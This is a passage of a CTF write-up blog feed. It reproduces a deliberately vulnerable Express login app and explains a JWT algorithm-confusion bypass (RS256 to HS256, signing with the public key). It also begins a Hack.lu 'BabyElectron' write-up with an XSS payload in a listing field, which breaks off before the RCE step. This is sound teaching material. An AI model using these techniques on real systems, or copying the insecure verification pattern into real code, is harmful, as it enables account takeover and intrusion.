+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">bodyParser</span><span class="p">.</span><span class="nf">json</span><span class="p">());</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nf">session</span><span class="p">({</span>
+  <span class="na">keys</span><span class="p">:</span> <span class="p">[</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">SESSION_SECRET</span><span class="p">],</span> 
+  <span class="na">httpOnly</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+  <span class="na">sameSite</span><span class="p">:</span> <span class="dl">'</span><span class="s1">strict</span><span class="dl">'</span><span class="p">,</span>
+<span class="p">}));</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">morgan</span><span class="dl">'</span><span class="p">)(</span><span class="dl">'</span><span class="s1">dev</span><span class="dl">'</span><span class="p">));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nf">static</span><span class="p">(</span><span class="dl">'</span><span class="s1">static</span><span class="dl">'</span><span class="p">));</span>
+
+<span class="kd">const</span> <span class="nx">REDIS_URL</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">[</span><span class="dl">'</span><span class="s1">REDIS_URL</span><span class="dl">'</span><span class="p">]</span> <span class="p">?</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">[</span><span class="dl">'</span><span class="s1">REDIS_URL</span><span class="dl">'</span><span class="p">]</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">redis://redis:6379</span><span class="dl">'</span>
+<span class="kd">const</span> <span class="nx">redisClient</span> <span class="o">=</span> <span class="nx">redis</span><span class="p">.</span><span class="nf">createClient</span><span class="p">(</span><span class="nx">REDIS_URL</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">privateKey</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nf">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">../keys/private_key.pem</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">publicKey</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nf">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">../keys/public_key.pem</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">flags</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="na">flag1</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG1</span><span class="p">,</span>
+  <span class="na">flag2</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG2</span><span class="p">,</span>
+<span class="p">};</span>
+
+
+<span class="kd">const</span> <span class="nx">offers</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">fs</span><span class="p">.</span><span class="nf">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">offers.json</span><span class="dl">'</span><span class="p">));</span>
+
+<span class="kd">function</span> <span class="nf">redirectUnauthorized</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span> <span class="o">==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="nf">next</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nf">verifyJwtToken</span><span class="p">(</span><span class="nx">jwt_token</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="p">{</span><span class="nx">header</span><span class="p">,</span> <span class="nx">payload</span><span class="p">,</span> <span class="nx">signature</span><span class="p">}</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="nx">jwt_token</span><span class="p">,</span> <span class="p">{</span><span class="na">complete</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
+  <span class="kd">const</span> <span class="nx">alg</span> <span class="o">=</span> <span class="nx">header</span><span class="p">.</span><span class="nx">alg</span><span class="p">;</span>
+  
+  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">alg</span> <span class="o">||</span> <span class="nx">alg</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">none</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// disabled for security reasons</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">verify</span><span class="p">(</span><span class="nx">jwt_token</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span><span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="nx">header</span><span class="p">.</span><span class="nx">alg</span><span class="p">]});</span>
+  <span class="p">}</span>  <span class="k">catch</span> <span class="p">{</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span> <span class="o">!==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/home</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">login</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/get_token</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">jwt</span><span class="p">.</span><span class="nf">sign</span><span class="p">({</span><span class="dl">'</span><span class="s1">login_permissions</span><span class="dl">'</span><span class="p">:</span> <span class="kc">false</span><span class="p">},</span> <span class="nx">privateKey</span><span class="p">,</span> <span class="p">{</span><span class="na">algorithm</span><span class="p">:</span> <span class="dl">'</span><span class="s1">RS256</span><span class="dl">'</span><span class="p">}));</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">user</span><span class="p">;</span>
+  <span class="kd">const</span> <span class="nx">jwtToken</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">authorization</span><span class="p">;</span>
+
+  <span class="k">if </span><span class="p">(</span><span class="nx">jwtToken</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="nx">user</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">sendStatus</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="kd">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nf">verifyJwtToken</span><span class="p">(</span><span class="nx">jwtToken</span><span class="p">);</span>
+
+  <span class="k">if </span><span class="p">(</span><span class="nx">payload</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">sendStatus</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">if </span><span class="p">(</span><span class="nx">payload</span><span class="p">.</span><span class="nx">login_permissions</span> <span class="o">!==</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">sendStatus</span><span class="p">(</span><span class="mi">401</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">if </span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">"</span><span class="s2">admin-secret</span><span class="dl">"</span><span class="p">]</span> <span class="o">!==</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">ADMIN_SECRET</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">sendStatus</span><span class="p">(</span><span class="mi">403</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">user</span><span class="p">;</span>
+  <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">isAdmin</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/home</span><span class="dl">'</span><span class="p">,</span> <span class="nx">redirectUnauthorized</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">home</span><span class="dl">'</span><span class="p">,</span> <span class="nf">homeParams</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">isAdmin</span><span class="p">));</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/report</span><span class="dl">'</span><span class="p">,</span> <span class="nx">redirectUnauthorized</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">report</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">user</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="na">isAdmin</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">isAdmin</span><span class="p">});</span>
+<span class="p">})</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/report</span><span class="dl">'</span><span class="p">,</span> <span class="nx">redirectUnauthorized</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">?.</span><span class="nx">reportUrl</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">sendStatus</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="c1">// admin looks at it</span>
+  <span class="nx">redisClient</span><span class="p">.</span><span class="nf">lpush</span><span class="p">(</span><span class="dl">"</span><span class="s2">links</span><span class="dl">"</span><span class="p">,</span> <span class="p">[</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">?.</span><span class="nx">reportUrl</span><span class="p">])</span>
+  <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">sendStatus</span><span class="p">(</span><span class="mi">200</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/offers</span><span class="dl">'</span><span class="p">,</span> <span class="nx">redirectUnauthorized</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">offers</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">user</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="na">isAdmin</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">isAdmin</span><span class="p">,</span> <span class="nx">offers</span><span class="p">,</span> <span class="na">offersString</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">offers</span><span class="p">)});</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/checkout</span><span class="dl">'</span><span class="p">,</span> <span class="nx">redirectUnauthorized</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">checkout</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">user</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="na">isAdmin</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">isAdmin</span><span class="p">});</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/logout</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">req</span><span class="p">.</span><span class="nx">session</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s2">`PVA listening on http://0.0.0.0:</span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="kd">function</span> <span class="nf">homeParams</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="nx">isAdmin</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">vitamin</span> <span class="o">=</span> <span class="nx">isAdmin</span> <span class="p">?</span> <span class="nx">flags</span><span class="p">.</span><span class="nx">flag2</span> <span class="p">:</span> <span class="nx">flags</span><span class="p">.</span><span class="nx">flag1</span><span class="p">;</span>
+  <span class="kd">const</span> <span class="nx">price</span> <span class="o">=</span> <span class="nx">isAdmin</span> <span class="p">?</span> <span class="mf">1337.99</span> <span class="p">:</span> <span class="mf">41.99</span><span class="p">;</span>
+  <span class="kd">const</span> <span class="nx">specialOffer</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="nx">vitamin</span><span class="p">,</span>
+    <span class="nx">price</span>
+  <span class="p">};</span>
+  <span class="kd">const</span> <span class="nx">params</span> <span class="o">=</span> <span class="p">{</span><span class="nx">user</span><span class="p">,</span> <span class="nx">specialOffer</span><span class="p">,</span> <span class="nx">isAdmin</span><span class="p">};</span>
+  <span class="k">if </span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">().</span><span class="nf">includes</span><span class="p">(</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nx">params</span><span class="p">[</span><span class="dl">"</span><span class="s2">show</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nx">params</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As we can see, the <code class="language-plaintext highlighter-rouge">/login</code> endpoint checks for a JWT, verifies it, checks for <code class="language-plaintext highlighter-rouge">login_permissions</code> set to <code class="language-plaintext highlighter-rouge">true</code> and then checks if the user logged in with an <code class="language-plaintext highlighter-rouge">admin</code> username and if so, if the <code class="language-plaintext highlighter-rouge">admin-secret</code> was sent correctly as a second security mechanism for admin log in.</p>
+
+<p>So, as we do not know the admin secret and the code does not show any way of getting my hands on that, I suspect the challenge for now is to log in as a normal user. What prevents that is the <code class="language-plaintext highlighter-rouge">login_permissions</code> set to false, they need to be true. However, this part is hardcoded into the JWT body. So naturally, there must be a way of tampering with the JWT so that I can change the body and bypass authentication that way.</p>
+
+<p>Just changing the body won’t work however, since the JWT is signed with the private key of the application, which I don’t have (I was only provided with the public key which is used in verification of the signature).</p>
+
+<p>The following part makes me suspicious:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">verifyJwtToken</span><span class="p">(</span><span class="nx">jwt_token</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="p">{</span><span class="nx">header</span><span class="p">,</span> <span class="nx">payload</span><span class="p">,</span> <span class="nx">signature</span><span class="p">}</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="nx">jwt_token</span><span class="p">,</span> <span class="p">{</span><span class="na">complete</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
+  <span class="kd">const</span> <span class="nx">alg</span> <span class="o">=</span> <span class="nx">header</span><span class="p">.</span><span class="nx">alg</span><span class="p">;</span>
+  
+  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">alg</span> <span class="o">||</span> <span class="nx">alg</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">none</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// disabled for security reasons</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">verify</span><span class="p">(</span><span class="nx">jwt_token</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span><span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="nx">header</span><span class="p">.</span><span class="nx">alg</span><span class="p">]});</span>
+  <span class="p">}</span>  <span class="k">catch</span> <span class="p">{</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The verification of the JWT does not work with a hardcoded algorithm. When verifying, the algorithm to be used is read from the header of the individual JWT token sent to the backend.</p>
+
+<p>A security check is being done however to make sure the algorithm can not be set to <code class="language-plaintext highlighter-rouge">None</code>, which would allow to skip verification of the signature completely.</p>
+
+<p>So, what do we have/know?</p>
+
+<ul>
+  <li>The “default” algorithm used by the webapp when creating the tokens is RS256, which is an asymmetric algorithm</li>
+  <li>We can set the algorithm of the verification</li>
+  <li>We have the public key of the web app</li>
+  <li>The public key is used to verify the signature</li>
+</ul>
+
+<p>This makes the JWT vulnerable. We can essentially change the body of the JWT to anything we want and change the algorithm in the header of the JWT to a symmetric one (e.g. HS256) as opposed to an asymmetric one, which makes sure that the same key is used for signing as for verification. As we know that the public key is used for verification, we can now use it for signing. The web app will then receive a JWT signed with the public key, will use the symmetric algorithm we defined in the header for verification along with the public key (which is hardcoded for verification). Therefore, the verification will now succeed.</p>
+
+<p>So, I could of course manually change this stuff and manually sign. But as I got the whole source code and can start it in docker, I just start the source code locally, change the body and algorithm in the local code, swap the signing key to the public key, which makes the local web app now return a JWT with the right body and algorithm signed with the public key. This I can now provide to the actual web app for bypassing verification.</p>
+
+<p><img src="img/uniweb7_getTokenCode.png" alt="" /></p>
+
+<p>…becomes…</p>
+
+<p><img src="img/uniweb8_getTokenCodeChanged.png" alt="" /></p>
+
+<p>The endpoint returns this token (note that it is now much shorter, because of the symmetric algorithm signature)…</p>
+
+<p><img src="img/uniweb9_newTokenBurp.png" alt="" /></p>
+
+<p>…which decodes to:</p>
+
+<p><code class="language-plaintext highlighter-rouge">{"alg":"HS256","typ":"JWT"}{"login_permissions":true,"iat":1676981563}...Õ³It&amp;.öüèr.vi.âÓ.Ö¸+î,Ì..ü2r_</code></p>
+
+<p>Now, when I use this token to log into the actual application, the login succeeds:</p>
+
+<p><img src="img/uniweb10_loginWorks.png" alt="" /></p>
+
+<p><img src="img/uniweb11_flag.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">FLG1{5be40603e5915e91e18f309bfce18a7b78e2109c}</code></p>
+
+<h2 id="lessons-learned">Lessons learned</h2>
+<p>Since I have already done a very similar challenge on portswigger, where exactly this attack is described in detail, it was just a refreshment of some concepts. I guess the challenge for me here was mainly identifying that the attack is possible by noticing the important parts in the code.</p>
+
+<p>https://portswigger.net/web-security/jwt/algorithm-confusion</p>]]></content><author><name>Jaak</name></author><category term="writeup" /><summary type="html"><![CDATA[Description The source code and the public key of a web application are provided. The flag format is FLG1{xxx}.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/img/thumbnail_image.png" /><media:content medium="image" url="/img/thumbnail_image.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack.lu 2022 CTF</title><link href="/2022/10/29/event.html" rel="alternate" type="text/html" title="Hack.lu 2022 CTF" /><published>2022-10-29T13:37:00+00:00</published><updated>2022-10-29T13:37:00+00:00</updated><id>/2022/10/29/event</id><content type="html" xml:base="/2022/10/29/event.html"><![CDATA[]]></content><author><name></name></author><summary type="html"><![CDATA[The 2022’s CTF will at hack.lu again be held by FluxFingers, the CTF Team of Ruhr-Universität Bochum (Germany).]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://ctftime.org/media/events/hacklu19.jpeg" /><media:content medium="image" url="https://ctftime.org/media/events/hacklu19.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">BabyElectron</title><link href="/writeup/2022/10/29/babyelectron.html" rel="alternate" type="text/html" title="BabyElectron" /><published>2022-10-29T09:10:05+00:00</published><updated>2022-10-29T09:10:05+00:00</updated><id>/writeup/2022/10/29/babyelectron</id><content type="html" xml:base="/writeup/2022/10/29/babyelectron.html"><![CDATA[<h2 id="description">Description</h2>
+<p>So you wanted to get into Electron Pwning? Your friend found a nice app, leaked its backend source from a Github repo he found while doxing some Luxembourg Real Estate Company. Pwn away by getting RCE! If you run into problems while setting it up reach out. This is the first flagstore for babyelectron.</p>
+
+<p>There are two flags: one in /flag which you can submit here and one in /printflag which you can submit at babyelectronV2</p>
+
+<h1 id="the-challenge">The challenge</h1>
+<p>The whole source code of the app, as well as the server-side code was provided.</p>
+
+<p>The electon app could be used used to buy, sell and report real estate objects.
+You can also report a real estate listing, which is then checked by a bot. 
+The goal is to get code execution of the machine of the bot, which is visiting the reported listing.</p>
+
+<h1 id="the-solution">The solution</h1>
+<p>The solution comprised two steps:</p>
+<ul>
+  <li>First, you needed to get XSS in the electron app.</li>
+  <li>Second, you needed to abuse the IPC function and get RCE.</li>
+</ul>
+
+<h2 id="setup">Setup</h2>
+<p>To make our lives easier, we started the electon app with: <code class="language-plaintext highlighter-rouge">electron . --proxy-server=127.0.0.1:8080</code> to be able to route the traffic of the app through burp.
+Furhtermore, we enabled the developer tools by commenting out: <code class="language-plaintext highlighter-rouge">mainWindow.webContents.openDevTools()</code> in main.js</p>
+
+<h2 id="first-step---getting-xss">First step - Getting XSS</h2>
+<p>In the support.js function from the <code class="language-plaintext highlighter-rouge">app</code> code, we see the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// security we learned from a bugbounty report
+    listing.msg = DOMPurify.sanitize(listing.msg)
+
+    const div = `
+        &lt;div class="card col-xs-3" style="width: 18rem;"&gt;
+            &lt;span id="REL-0-houseId" style="display: none;"&gt;${listing.houseId}&lt;/span&gt;
+            &lt;img class="card-img-top" id="REL-0-image" src="../${listing.image}" alt="REL-img"&gt;
+            &lt;div class="card-body"&gt;
+              &lt;h5 class="card-title" id="REL-0-name"&gt;${listing.name}&lt;/h5&gt;
+              &lt;h6 class="card-subtitle mb-2 text-muted" id="REL-0-sqm"&gt;${listing.sqm} sqm&lt;/h6&gt;
+              &lt;p class="card-text" id="REL-0-message"&gt;${listing.message}&lt;/p&gt;
+              &lt;input type="number" class="form-control" id="REL-0-price" placeholder="${listing.price}"&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div&gt;
+            ${listing.msg}
+        &lt;/div&gt;
+  `
+</code></pre></div></div>
+<p>listing.msg does get sanitized, however the other parameter do not.
+The idea is to get script execution using <code class="language-plaintext highlighter-rouge">listing.message</code> parameter.</p>
+
+<p>On the first impression its only possible to write the listing.msg parameter which gets posted with the report to get XSS.
+As its gets sanitized, this is not possible.</p>
+
+<p>However, when selling a real estate you can specify the <code class="language-plaintext highlighter-rouge">listing.message</code> when intercepting the message with burp.
+So we altered the message parameter of to <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=\"alert(1);\"&gt;</code></p>
+
+<p>Then, we checked if the XSS worked, by visiting the support page with out own electron app. 
+Therefor we simply added a reference index.html s.t. it also had a link to the support page:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"nav-item"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-link"</span> <span class="na">href=</span><span class="s">"../views/support.html"</span><span class="nt">&gt;</span>
+      Support
+    <span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;/li&gt;</span>
+</code></pre></div></div>
+<p>And also included links on the support.html page to navigate back to the other pages:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div&gt;</span>
+    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"../views/index.html"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span>
+    <span class="nt">&lt;a</span>  <span class="na">href=</span><span class="s">"../views/listings.html"</span><span class="nt">&gt;</span>Buy<span class="nt">&lt;/a&gt;</span>
+    <span class="nt">&lt;a</span>  <span class="na">href=</span><span class="s">"../views/portfolio.html"</span><span class="nt">&gt;</span>My Portfolio<span class="nt">&lt;/a&gt;</span>
+    <span class="nt">&lt;a</span>  <span class="na">href=</span><span class="s">"../views/support.html"</span><span class="nt">&gt;</span>Support<span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+</code></pre></div></div>
+
+<p>We then navigated to the support page and intercepted the http request with burp and filled in the id, given when reporting the listing.
+Thus, we could confirm the XSS.</p>
+
+<h2 id="step-2">Step 2</h2>
+
